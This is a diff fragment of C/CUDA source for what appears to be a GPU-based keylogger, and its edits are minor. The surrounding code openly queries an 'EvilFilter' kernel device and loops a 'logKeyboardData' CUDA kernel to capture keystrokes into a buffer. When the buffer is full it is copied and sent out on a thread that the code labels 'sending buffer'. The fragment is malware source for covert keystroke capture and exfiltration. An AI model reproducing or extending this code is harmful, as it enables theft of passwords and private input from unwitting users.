@@ -192,7 +192,7 @@ int main(int argc, _TCHAR* argv[]) {
 		}
 		kmdfFlagOffset = dataToTransmit->offset;
 		largeFlag = dataToTransmit->largePage;
-		printf("Ioctl to EvilFilter device succeeded...KMDF Flag offset is [0x%lx]\n", kmdfFlagOffset);
+		printf("Ioctl to EvilFilter device succeeded...KMDF Flag offset is [0x%lx]\nConstructing pointers.\n", kmdfFlagOffset);
 
 		// create a pointer with the correct offset
 		listNode = (PLLIST)malloc(sizeof(LLIST));
@@ -288,7 +288,6 @@ int main(int argc, _TCHAR* argv[]) {
 		PULONG d_keyboardState;
 		PULONG h_keystrokeIndex;
 		USHORT init0 = 666U;
-		//ULONG init0long = 0LU;
 		ULONG init666long = 666LU;
 
 		checkCudaErrors(cudaSetDevice(0));
@@ -302,7 +301,6 @@ int main(int argc, _TCHAR* argv[]) {
 		checkCudaErrors(cudaMalloc(&d_lastMake,                sizeof(USHORT)));
 		checkCudaErrors(cudaMalloc(&d_lastModifier,            sizeof(USHORT)));
 		checkCudaErrors(cudaMalloc(&d_shiftStatus,             sizeof(USHORT)));
-//		checkCudaErrors(cudaMalloc(&d_keystrokeIndex,          sizeof(ULONG)));
 		checkCudaErrors(cudaMalloc(&d_keyboardState,           sizeof(ULONG)));
 		checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
 		checkCudaErrors(cudaMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
@@ -311,7 +309,6 @@ int main(int argc, _TCHAR* argv[]) {
 		checkCudaErrors(cudaMemcpy(d_lastMake,         &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
 		checkCudaErrors(cudaMemcpy(d_lastModifier,     &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
 		checkCudaErrors(cudaMemcpy(d_shiftStatus,      &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
-//		checkCudaErrors(cudaMemcpy(d_keystrokeIndex,   &init0long,     sizeof(ULONG),     cudaMemcpyHostToDevice));
 		checkCudaErrors(cudaMemcpy(d_keyboardState,    &init666long,   sizeof(ULONG),     cudaMemcpyHostToDevice));
 		checkCudaErrors(cudaMemcpy(d_KeyMap,           KeyMap,         84 * sizeof(char), cudaMemcpyHostToDevice));	
 		checkCudaErrors(cudaMemcpy(d_KeyMap2,          ExtendedKeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	
@@ -329,14 +326,12 @@ int main(int argc, _TCHAR* argv[]) {
 		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_keystrokeIndex, (void *)h_keystrokeIndex, 0));
 
 		printf("Launching CUDA process.\n");
-		dim3 grid(1);
-		dim3 block(1);
 		while (TRUE) { 
 			logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyboardFlag, d_KeyMap, d_KeyMap2, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_shiftStatus, d_keystrokeIndex, d_keyboardState);
 			checkCudaErrors(cudaDeviceSynchronize());
 			if (*h_keystrokeIndex >= BUFFER_SIZE) {
 				printf("copying buffer.\n");
-				copyKeyboardBuffer <<<BUFFER_GRID, BUFFER_BLOCK >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
+				copyKeyboardBuffer <<<32, 256 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
 				checkCudaErrors(cudaDeviceSynchronize());
 				printf("sending buffer.\n"); 
 				CreateThread(NULL, 0, xmitBuffer, (LPVOID)h_OutgoingKeystrokeBuffer, 0, NULL);
